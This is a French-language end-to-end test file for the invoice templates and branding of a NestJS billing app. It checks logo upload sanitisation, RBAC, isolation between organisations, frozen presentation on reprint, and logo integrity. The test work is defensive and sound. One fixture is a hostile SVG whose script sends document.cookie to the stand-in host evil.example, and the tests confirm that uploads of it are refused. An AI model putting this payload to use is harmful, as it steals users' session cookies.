// Modèles de facture et identité visuelle contre la vraie application (ADR-0028).
//
// Chaîne complète : cookie → better-auth → AuthGuard → PermissionsGuard →
// contrôleur → MongoDB (transactions) → MinIO → modèle → moteur de rendu. Les
// factures normalisées le sont par le VRAI client e-MCF contre le FAUX serveur
// e-MCF local : aucun appel à la DGI réelle.
//
// Le rendu Chromium est remplacé par un double qui renvoie `%PDF-FAKE` suivi du
// HTML (comme `invoice-documents.e2e.test.ts`) : on lit dans le HTML le modèle,
// le logo intégré, les mentions. Le rendu réel de chaque modèle est couvert par
// `sales/documents/invoice-pdf.render.test.ts`.
//
// Exigences prouvées : téléversement assaini d'un logo (SVG refusé), isolation
// entre organisations, RBAC (`organization.manage` / `sales.read`), gel du
// modèle et de l'identité, réimpression IDENTIQUE après changement de modèle et
// de logo, duplicata avec la présentation figée, révocation des URL de logo,
// présentation d'origine sans modèle choisi, aperçu EXEMPLE, intégrité du logo.
//
// Prérequis : MongoDB et MinIO (`S3_*`). BASE DÉDIÉE, supprimée à la fin ;
// objets de logos supprimés du bucket à la fin. NIF et jetons inventés.

import 'reflect-metadata';

import type { INestApplication } from '@nestjs/common';
import { ThrottlerStorage } from '@nestjs/throttler';
import type { Db } from 'mongodb';
import { ObjectId } from 'mongodb';
import { createHash, randomBytes } from 'node:crypto';
import request from 'supertest';
import { afterAll, beforeAll, beforeEach, expect, it, vi } from 'vitest';

import { BrandingService } from '../branding/branding.service.js';
import { startFakeEdefServer, type FakeEdefServer } from '../edef/testing/fake-edef-server.js';
import { PdfRenderingService } from '../reports/pdf-rendering.service.js';
import { TEST_BANNER } from '../sales/documents/invoice-document.model.js';
import { qrCodeSvg } from '../sales/documents/invoice-qr.js';
import { testLogoBytes } from '../sales/documents/testing/template-fixtures.js';
import { contentSha256Of } from '../sales/invoices/canonical.js';
import { ObjectStorageService } from '../storage/object-storage.service.js';
import { dbOf, e2eSuite, makeE2EApp, registerAndLogin } from './e2e-utils.js';

const tag = randomBytes(4).toString('hex');
process.env['MONGODB_DB'] = `lalanda_e2e_modeles_${tag}`;
process.env['SECRETS_MASTER_KEY'] = randomBytes(32).toString('base64');
process.env['SECRETS_MASTER_KEY_ID'] = 'k1';
process.env['DGI_ISF_TEST'] = process.env['DGI_ISF_TEST'] || 'ISF-TEST-E2E';
process.env['DGI_HTTP_TIMEOUT_MS'] = '10000';
delete process.env['DGI_PRODUCTION_ENABLED'];

vi.setConfig({ testTimeout: 600_000 });

const S3_CONFIGURE = Boolean(
  process.env['S3_ENDPOINT'] &&
  process.env['S3_ACCESS_KEY'] &&
  process.env['S3_SECRET_KEY'] &&
  process.env['S3_BUCKET_UPLOADS'],
);

const MOT_DE_PASSE = 'Passw0rd!modeles';
const NIF_N = 'A0000000X';
const NIF_S = 'S0000000X';
const NIM = 'XX01000001-1';
const JETON = `ANTIFUITE-modeles-${tag}-0123456789abcdef`;

const GROUPES: Record<string, number> = {
  a: 0,
  b: 16,
  c: 5,
  d: 0,
  e: 0,
  f: 16,
  g: 5,
  h: 0,
  i: 0,
  j: 0,
  k: 0,
  l: 0,
  m: 0,
  n: 0,
  o: 1,
  p: 1,
};

const LIGNE = {
  source: 'free',
  code: 'CONSEIL-H',
  name: 'Conseil (heure)',
  itemType: 'SER',
  taxGroup: 'B',
  outOfScope: false,
  unit: 'heure',
  quantity: '2',
  unitPrice: '40.00',
  specificTax: null,
  discount: null,
};

const SVG_HOSTILE = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">' +
    '<script>fetch("https://evil.example/"+document.cookie)</script></svg>',
);

type Compte = 'owner' | 'analyst' | 'ownerS';

function binary(req: request.Test): request.Test {
  return req.buffer(true).parse((res, cb) => {
    const chunks: Buffer[] = [];
    res.on('data', (c: Buffer) => chunks.push(c));
    res.on('end', () => cb(null, Buffer.concat(chunks)));
  });
}

const sha = (b: Buffer) => createHash('sha256').update(b).digest('hex');

e2eSuite('modèles de facture et identité visuelle (ADR-0028)', () => {
  let app: INestApplication;
  let db: Db;
  let fake: FakeEdefServer;
  let orgN = '';
  let orgS = '';
  let customerN = '';
  const cookies = {} as Record<Compte, string[]>;
  const emails = {} as Record<Compte, string>;

  const server = () => app.getHttpServer();
  const asN = (c: 'owner' | 'analyst' = 'owner') => [...cookies[c], `active_org_id=${orgN}`];
  const asS = () => [...cookies['ownerS'], `active_org_id=${orgS}`];
  const get = (c: string[], path: string) => request(server()).get(path).set('Cookie', c);
  const post = (c: string[], path: string, body?: unknown) =>
    request(server())
      .post(path)
      .set('Cookie', c)
      .send(body ?? {});
  const put = (c: string[], path: string, body: unknown) =>
    request(server()).put(path).set('Cookie', c).send(body);
  const del = (c: string[], path: string) => request(server()).delete(path).set('Cookie', c);
  const upload = (c: string[], variant: string, bytes: Buffer, type = 'image/png') =>
    request(server())
      .post(`/organizations/current/brand/logos/${variant}`)
      .set('Cookie', c)
      .set('Content-Type', type)
      .send(bytes);
  const pdf = (c: string[], id: string) =>
    binary(request(server()).get(`/sales/invoices/${id}/pdf`).set('Cookie', c));
  const duplicata = (c: string[], id: string) =>
    binary(request(server()).post(`/sales/invoices/${id}/duplicate`).set('Cookie', c).send({}));
  const text = (res: request.Response) => (res.body as Buffer).toString('utf8');
  const clearThrottle = () => {
    const store = app.get(ThrottlerStorage) as unknown as {
      storage: Map<string, unknown>;
      timeoutIds: Map<string, NodeJS.Timeout[]>;
    };
    for (const ids of store.timeoutIds.values()) ids.forEach(clearTimeout);
    store.timeoutIds.clear();
    store.storage.clear();
  };
  const enBase = (id: string) => db.collection('sales_invoices').findOne({ _id: new ObjectId(id) });
  const brand = async (c: string[] = asN()) => {
    const res = await get(c, '/organizations/current/brand');
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  };
  const choisir = async (templateId: string | null, options: Record<string, unknown> = {}) => {
    const cur = await get(asN(), '/sales/invoice-templates');
    const res = await put(asN(), '/sales/invoice-template', {
      templateId,
      options: { palette: null, accent: null, font: null, ...options },
      expectedRevision: cur.body.revision,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  };
  /** URL absolue de l'API → chemin, servi par l'application de test. */
  const chemin = (url: string) => new URL(url).pathname;

  const corps = (customerId: string) => ({
    type: 'FV',
    currency: 'USD',
    priceMode: 'ht',
    customer: { customerId, printContactDetails: false },
    pointOfSaleId: null,
    lines: [LIGNE],
    payments: [],
    comments: { A: null, C: null },
    creditNote: null,
    showUsdCounterValue: false,
  });

  async function brouillonPret(c: string[], customerId: string) {
    const body = corps(customerId);
    const d = await post(c, '/sales/invoices', body);
    expect(d.status, JSON.stringify(d.body)).toBe(201);
    const total = d.body.documentAmounts.calculation.totals.total as string;
    const res = await put(c, `/sales/invoices/${d.body.id}`, {
      ...body,
      payments: [{ method: 'VIREMENT', amount: total }],
      expectedRevision: d.body.revision,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body as Record<string, any>;
  }

  async function normalisee() {
    const d = await brouillonPret(asN(), customerN);
    const res = await post(asN(), `/sales/invoices/${d.id}/normalize`, {
      expectedRevision: d.revision,
      exchangeRate: null,
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(res.body.status).toBe('normalized');
    return res.body as Record<string, any>;
  }

  async function instantane(list: string, payload: unknown) {
    await db.collection('edef_reference_snapshots').insertOne({
      environment: 'test',
      list,
      sha256: randomBytes(32).toString('hex'),
      payload,
      fetchedAt: new Date(),
      _schemaVersion: 1,
    });
  }

  beforeAll(async () => {
    fake = await startFakeEdefServer({
      tokens: { [JETON]: { nif: NIF_N, nim: NIM, tokenValid: '2099-01-31T00:00:00' } },
      taxGroups: GROUPES,
    });
    process.env['DGI_EDEF_TEST_URL'] = fake.baseUrl;
    process.env['DGI_EDEF_PRODUCTION_URL'] = 'https://edef.invalid';
    app = await makeE2EApp();
    db = await dbOf(app);
    await new Promise<void>((resolve) => app.getHttpServer().listen(0, '127.0.0.1', resolve));

    vi.spyOn(app.get(PdfRenderingService), 'render').mockImplementation(async (html, opts) =>
      Buffer.from(
        `%PDF-FAKE\n${html}\n<!--header-->${opts?.headerTemplate ?? ''}\n<!--footer-->${opts?.footerTemplate ?? ''}\n<!--margin-->${JSON.stringify(opts?.margin ?? null)}`,
        'utf8',
      ),
    );

    for (const c of ['owner', 'analyst', 'ownerS'] as const) {
      emails[c] = `modeles-${c}-${tag}@lalanda-test.local`;
    }
    const compte = (c: Compte) => ({ email: emails[c], password: MOT_DE_PASSE, name: `Mod ${c}` });
    const orgDe = async (c: Compte) => {
      cookies[c] = await registerAndLogin(app, compte(c));
      const orgs = await request(server()).get('/organizations').set('Cookie', cookies[c]);
      return (orgs.body.organizations as { id: string }[])[0]!.id;
    };
    orgN = await orgDe('owner');
    orgS = await orgDe('ownerS');
    const inv = await request(server())
      .post(`/organizations/${orgN}/invitations`)
      .set('Cookie', cookies['owner'])
      .send({ email: emails['analyst'], role: 'analyst' });
    expect(inv.status).toBe(201);
    cookies['analyst'] = await registerAndLogin(app, compte('analyst'));
    const acc = await request(server())
      .post('/invitations/accept')
      .set('Cookie', cookies['analyst'])
      .send({ token: inv.body.token });
    expect(acc.status).toBe(201);

    const fiche = (nif: string) => ({
      legalName: 'Exemple SARL',
      tradeName: null,
      legalForm: 'sarl',
      legalFormOther: null,
      nif,
      rccm: null,
      nationalId: null,
      vatRegistered: true,
      headOffice: {
        line1: '1, avenue Exemple',
        line2: null,
        commune: 'Gombe',
        city: 'Kinshasa',
        province: 'Kinshasa',
      },
      phone: '+243 800 000 000',
      email: 'contact@exemple.cd',
    });
    expect((await put(asN(), '/organizations/current/fiscal-profile', fiche(NIF_N))).status).toBe(
      200,
    );
    expect((await put(asS(), '/organizations/current/fiscal-profile', fiche(NIF_S))).status).toBe(
      200,
    );

    const reauth = async () =>
      expect((await post(cookies['owner'], '/me/reauth', { password: MOT_DE_PASSE })).status).toBe(
        200,
      );
    await reauth();
    const pos = await post(asN(), '/organizations/current/normalized-invoicing/points-of-sale', {
      label: 'Boutique',
      environment: 'test',
      expectedNim: null,
      token: JETON,
    });
    expect(pos.status, JSON.stringify(pos.body)).toBe(201);
    await reauth();
    const act = await post(asN(), '/organizations/current/normalized-invoicing/activate', {
      environment: 'test',
    });
    expect(act.status, JSON.stringify(act.body)).toBe(200);

    await instantane('taxGroups', GROUPES);
    await instantane('currencyRates', [
      {
        type: 'USD',
        description: 'Dollar (fictif)',
        date: '2026-10-19T00:00:00+01:00',
        rate: 2262.32,
      },
    ]);
    await instantane('clientTypes', [{ type: 'PM', description: 'Personne morale (fictif)' }]);
    await instantane('referenceTypes', [{ type: 'RRR', description: 'Remise (fictif)' }]);

    const cN = await post(asN(), '/sales/customers', {
      type: 'PM',
      name: 'Client Exemple SARL',
      nif: `T${tag.toUpperCase()}01`,
    });
    expect(cN.status, JSON.stringify(cN.body)).toBe(201);
    customerN = cN.body.id;
  }, 300_000);

  beforeEach(() => clearThrottle());

  afterAll(async () => {
    try {
      if (app) {
        const d = await dbOf(app);
        const storage = app.get(ObjectStorageService);
        const bucket = storage.uploadsBucket();
        if (bucket) {
          for (const a of await d.collection('organization_brand_assets').find().toArray()) {
            await storage.deleteObject(bucket, a['objectKey'] as string).catch(() => undefined);
          }
        }
        await d.dropDatabase();
      }
    } finally {
      await app?.close();
      await fake?.close();
    }
  }, 60_000);

  // ── Sans modèle choisi : présentation d'origine, inchangée ─────────────────

  it('sans modèle choisi : facture gelée SANS présentation, PDF d’origine', async () => {
    const v = await normalisee();
    const doc = await enBase(v.id);
    expect(doc && 'presentation' in doc ? doc['presentation'] : undefined).toBeUndefined();
    const t = text(await pdf(asN(), v.id));
    expect(t).toContain('class="test-mark">TEST<');
    expect(t).toContain('— gabarit 1.0.0');
    expect(t).not.toContain('data-template=');
  });

  // ── RBAC ────────────────────────────────────────────────────────────────────

  it('RBAC : l’analyste consulte et prévisualise, ne modifie ni l’identité ni le modèle', async () => {
    expect((await get(asN('analyst'), '/organizations/current/brand')).status).toBe(403);
    expect(
      (
        await put(asN('analyst'), '/organizations/current/brand/identity', {
          primaryColor: '#123456',
          secondaryColor: null,
          font: null,
          expectedRevision: 0,
        })
      ).status,
    ).toBe(403);
    expect((await upload(asN('analyst'), 'primary', testLogoBytes('primary'))).status).toBe(403);
    expect((await del(asN('analyst'), '/organizations/current/brand/logos/primary')).status).toBe(
      403,
    );
    expect(
      (
        await put(asN('analyst'), '/sales/invoice-template', {
          templateId: 'bandeau',
          options: { palette: null, accent: null, font: null },
          expectedRevision: 0,
        })
      ).status,
    ).toBe(403);
    const list = await get(asN('analyst'), '/sales/invoice-templates');
    expect(list.status).toBe(200);
    expect(list.body.templates.map((t: { id: string }) => t.id)).toEqual([
      'classique',
      'bandeau',
      'laterale',
      'minimal',
      'compacte',
      'editoriale',
    ]);
    const ap = await binary(get(asN('analyst'), '/sales/invoice-templates/minimal/preview'));
    expect(ap.status).toBe(200);
  });

  // ── Téléversement assaini ──────────────────────────────────────────────────

  it('logo : SVG, faux type et variante inconnue refusés ; rien n’est écrit', async () => {
    const svg = await upload(asN(), 'primary', SVG_HOSTILE, 'image/svg+xml');
    expect(svg.status).toBe(415);
    const ment = await upload(asN(), 'primary', SVG_HOSTILE, 'image/png');
    expect(ment.status).toBe(415);
    expect(ment.body.code).toBe('UNSUPPORTED_IMAGE_TYPE');
    expect((await upload(asN(), 'banniere', testLogoBytes('primary'))).status).toBe(400);
    expect(await db.collection('organization_brand_assets').countDocuments()).toBe(0);
  });

  it.skipIf(!S3_CONFIGURE)(
    'logo : PNG accepté, octets ASSAINIS stockés et servis, empreinte enregistrée',
    async () => {
      const bytes = Buffer.concat([
        testLogoBytes('primary'),
        Buffer.from('CHARGE-UTILE-APRES-IEND'),
      ]);
      const res = await upload(asN(), 'primary', bytes);
      expect(res.status, JSON.stringify(res.body)).toBe(201);
      const logo = res.body.logos.primary as Record<string, any>;
      expect(logo.contentType).toBe('image/png');
      const servi = await binary(request(server()).get(chemin(logo.url)));
      expect(servi.status).toBe(200);
      expect(servi.headers['x-content-type-options']).toBe('nosniff');
      expect(servi.headers['content-security-policy']).toContain("default-src 'none'");
      const served = servi.body as Buffer;
      expect(served.includes(Buffer.from('CHARGE-UTILE'))).toBe(false);
      expect(served.equals(testLogoBytes('primary'))).toBe(true);
      const enreg = await db
        .collection('organization_brand_assets')
        .findOne({ assetId: logo.assetId });
      expect(enreg?.['organizationId']).toBe(orgN);
      expect(enreg?.['sha256']).toBe(sha(testLogoBytes('primary')));
      // Aucune trace de l'organisation dans la clé d'objet.
      expect(enreg?.['objectKey']).toBe(`brand-assets/${logo.assetId}`);
      expect(String(enreg?.['objectKey'])).not.toContain(orgN);
    },
  );

  it('identité : couleurs et police validées, révision optimiste', async () => {
    const b = await brand();
    const bad = await put(asN(), '/organizations/current/brand/identity', {
      primaryColor: 'vert',
      secondaryColor: null,
      font: 'comic-sans',
      expectedRevision: b.revision,
    });
    expect(bad.status).toBe(400);
    const ok = await put(asN(), '/organizations/current/brand/identity', {
      primaryColor: '#0F5132',
      secondaryColor: '#9a3412',
      font: 'manrope',
      expectedRevision: b.revision,
    });
    expect(ok.status, JSON.stringify(ok.body)).toBe(200);
    expect(ok.body.primaryColor).toBe('#0f5132');
    const stale = await put(asN(), '/organizations/current/brand/identity', {
      primaryColor: '#000000',
      secondaryColor: null,
      font: null,
      expectedRevision: b.revision,
    });
    expect(stale.status).toBe(409);
    expect(stale.body.code).toBe('STALE_BRAND_REVISION');
  });

  // ── Choix du modèle, gel, réimpression identique ───────────────────────────

  it.skipIf(!S3_CONFIGURE)(
    'gel : modèle, options et empreinte de l’identité figés ; réimpression IDENTIQUE après changement',
    async () => {
      if ((await brand()).logos.primary === null) {
        expect((await upload(asN(), 'primary', testLogoBytes('primary'))).status).toBe(201);
      }
      expect((await upload(asN(), 'light', testLogoBytes('light'))).status).toBe(201);
      const police = await put(asN(), '/sales/invoice-template', {
        templateId: 'bandeau',
        options: { palette: null, accent: null, font: 'comic-sans' },
        expectedRevision: (await get(asN(), '/sales/invoice-templates')).body.revision,
      });
      expect(police.status).toBe(409);
      expect(police.body.code).toBe('FONT_NOT_ALLOWED');
      const choix = await choisir('bandeau', { accent: '#1d4ed8' });
      expect(choix.current).toMatchObject({
        templateId: 'bandeau',
        version: '1.0.0',
        resolved: { palette: 'brand', accent: '#1d4ed8', font: 'manrope' },
      });

      // Brouillon : imprimé avec le modèle courant.
      const d = await brouillonPret(asN(), customerN);
      const pro = text(await pdf(asN(), d.id));
      expect(pro).toContain('data-template="bandeau@1.0.0"');
      expect(pro).toContain('PRO FORMA — non valable comme facture');

      // Gel.
      const v = await normalisee();
      const doc = await enBase(v.id);
      const p = doc?.['presentation'] as Record<string, any>;
      const b = await brand();
      expect(p).toEqual({
        template: { id: 'bandeau', version: '1.0.0' },
        options: { palette: 'brand', accent: '#1d4ed8', font: 'manrope' },
        identity: {
          primaryColor: '#0f5132',
          secondaryColor: '#9a3412',
          font: 'manrope',
          logos: {
            primary: {
              assetId: b.logos.primary.assetId,
              sha256: sha(testLogoBytes('primary')),
              contentType: 'image/png',
              width: 96,
              height: 96,
            },
            horizontal: null,
            symbol: null,
            light: {
              assetId: b.logos.light.assetId,
              sha256: sha(testLogoBytes('light')),
              contentType: 'image/png',
              width: 96,
              height: 96,
            },
          },
        },
      });
      // L'empreinte du contenu couvre la présentation ; le journal reste chaîné.
      expect(contentSha256Of(doc as Record<string, unknown>)).toBe(doc?.['contentSha256']);
      expect(contentSha256Of({ ...doc, presentation: undefined })).not.toBe(doc?.['contentSha256']);
      expect((await get(asN(), '/sales/journal')).body.chainValid).toBe(true);

      const original = await pdf(asN(), v.id);
      expect(original.status).toBe(200);
      const avant = text(original);
      expect(avant).toContain('data-template="bandeau@1.0.0"');
      expect(avant).toContain(
        `src="data:image/png;base64,${testLogoBytes('light').toString('base64')}"`,
      );
      expect(avant).toContain('modèle Bandeau 1.0.0');
      expect(avant).toContain(v.normalization.codeDefDgi);
      expect(avant).toContain(await qrCodeSvg(v.normalization.qrCode));
      expect(avant).toContain(TEST_BANNER);
      expect(avant).toContain('class="dgi-watermark">TEST<');
      expect(avant).toContain('#1d4ed8');
      // Aucune URL : le logo est intégré, le PDF ne charge rien.
      expect(avant).not.toMatch(/src="https?:/);

      // L'organisation change TOUT : modèle, logos, couleurs, police.
      const ancienneUrl = b.logos.light.url as string;
      expect((await upload(asN(), 'light', testLogoBytes('symbol'))).status).toBe(201);
      expect((await del(asN(), '/organizations/current/brand/logos/primary')).status).toBe(200);
      const b2 = await brand();
      expect(
        (
          await put(asN(), '/organizations/current/brand/identity', {
            primaryColor: '#7f1d1d',
            secondaryColor: null,
            font: 'inter',
            expectedRevision: b2.revision,
          })
        ).status,
      ).toBe(200);
      await choisir('minimal', { palette: 'brand' });

      // Réimpression : octet pour octet le même original.
      const apres = await pdf(asN(), v.id);
      expect(text(apres)).toBe(avant);
      // Le duplicata reprend la présentation FIGÉE.
      const dup = text(await duplicata(asN(), v.id));
      expect(dup).toContain('data-template="bandeau@1.0.0"');
      expect(dup).toContain('DUPLICATA n° 1');
      // Un nouveau brouillon suit le modèle d'aujourd'hui.
      const d2 = await brouillonPret(asN(), customerN);
      expect(text(await pdf(asN(), d2.id))).toContain('data-template="minimal@1.0.0"');

      // Révocation : l'ancienne URL du logo remplacé ne sert plus rien.
      expect((await request(server()).get(chemin(ancienneUrl))).status).toBe(404);
      const b3 = await brand();
      expect((await request(server()).get(chemin(b3.logos.light.url))).status).toBe(200);
      expect(b3.logos.primary).toBeNull();
    },
  );

  // ── Isolation entre organisations ──────────────────────────────────────────

  it.skipIf(!S3_CONFIGURE)(
    'isolation : une organisation ne voit ni n’imprime les logos d’une autre',
    async () => {
      const bN = await brand();
      const bS = await brand(asS());
      expect(Object.values(bS.logos).every((l) => l === null)).toBe(true);
      // S choisit un modèle : sa facture ne porte aucun logo de N.
      const curS = await get(asS(), '/sales/invoice-templates');
      expect(curS.body.current).toBeNull();
      expect(curS.body.identity.logos.light).toBe(false);
      // Un identifiant de logo de N, présenté pour S, est refusé au rendu.
      const service = app.get(BrandingService);
      const refN = {
        assetId: bN.logos.light.assetId as string,
        sha256: sha(testLogoBytes('symbol')),
        contentType: 'image/png' as const,
        width: 64,
        height: 64,
      };
      await expect(
        service.resolveForRender(orgS, {
          template: { id: 'classique', version: '1.0.0' },
          options: { palette: 'brand', accent: '#0f5132', font: 'inter' },
          identity: {
            primaryColor: null,
            secondaryColor: null,
            font: null,
            logos: { primary: null, horizontal: null, symbol: null, light: refN },
          },
        }),
      ).rejects.toMatchObject({ response: { code: 'BRAND_ASSET_INTEGRITY' } });
      // N lui-même le résout.
      await expect(
        service.resolveForRender(orgN, {
          template: { id: 'classique', version: '1.0.0' },
          options: { palette: 'brand', accent: '#0f5132', font: 'inter' },
          identity: {
            primaryColor: null,
            secondaryColor: null,
            font: null,
            logos: { primary: null, horizontal: null, symbol: null, light: refN },
          },
        }),
      ).resolves.toMatchObject({ logos: { light: { width: 64 } } });
    },
  );

  // ── Aperçu ─────────────────────────────────────────────────────────────────

  it('aperçu : facture fictive EXEMPLE au nom de l’organisation, options passées', async () => {
    const res = await binary(
      get(asN(), '/sales/invoice-templates/compacte/preview?palette=mono&font=manrope'),
    );
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('application/pdf');
    expect(res.headers['content-disposition']).toBe(
      'inline; filename="apercu-modele-compacte.pdf"',
    );
    const t = text(res);
    expect(t).toContain('data-template="compacte@1.0.0"');
    expect(t).toContain('class="dgi-watermark sample">EXEMPLE<');
    expect(t).toContain('Exemple fictif — aperçu du modèle');
    expect(t).toContain('Exemple SARL'); // fiche fiscale de l'organisation
    expect(t).toContain('EXEMPLE-000042');
    expect(t).toContain("'Lalanda Manrope'");
    // Noir et blanc : en-tête du tableau à l'encre, aucune couleur de marque.
    expect(t).toContain('background:#111111;color:#ffffff');
    // Rien d'enregistré : aucune facture créée par l'aperçu.
    expect(await db.collection('sales_invoices').countDocuments({ number: 'EXEMPLE-000042' })).toBe(
      0,
    );
    expect((await get(asN(), '/sales/invoice-templates/inconnu/preview')).status).toBe(400);
    expect(
      (await get(asN(), '/sales/invoice-templates/editoriale/preview?font=inter')).status,
    ).toBe(400);
    expect((await get(asN(), '/sales/invoice-templates/minimal/preview?accent=rouge')).status).toBe(
      400,
    );
  });

  // ── Intégrité ──────────────────────────────────────────────────────────────

  it.skipIf(!S3_CONFIGURE)(
    'intégrité : un logo figé dont les octets ont changé bloque la réimpression (409), jamais un faux',
    async () => {
      // Logo neuf, jamais encore lu par un rendu (aucun cache).
      expect((await upload(asN(), 'horizontal', testLogoBytes('horizontal'))).status).toBe(201);
      await choisir('classique');
      const v = await normalisee();
      const doc = await enBase(v.id);
      const ref = (doc?.['presentation'] as any).identity.logos.horizontal;
      expect(ref).not.toBeNull();
      const asset = await db
        .collection('organization_brand_assets')
        .findOne({ assetId: ref.assetId });
      const storage = app.get(ObjectStorageService);
      const bucket = storage.uploadsBucket()!;
      // Quelqu'un réécrit l'objet dans le bucket.
      await storage.putObject(
        bucket,
        asset!['objectKey'] as string,
        testLogoBytes('symbol'),
        'image/png',
      );
      const res = await pdf(asN(), v.id);
      expect(res.status).toBe(409);
      expect(JSON.parse(text(res)).code).toBe('BRAND_ASSET_INTEGRITY');
      // Octets d'origine rétablis : l'original se réimprime.
      await storage.putObject(
        bucket,
        asset!['objectKey'] as string,
        testLogoBytes('horizontal'),
        'image/png',
      );
      expect((await pdf(asN(), v.id)).status).toBe(200);
    },
  );

  it('retour à la présentation d’origine : `templateId: null`', async () => {
    const res = await choisir(null);
    expect(res.current).toBeNull();
    const v = await normalisee();
    const doc = await enBase(v.id);
    expect(doc?.['presentation'] ?? null).toBeNull();
    expect(text(await pdf(asN(), v.id))).toContain('— gabarit 1.0.0');
  });
});
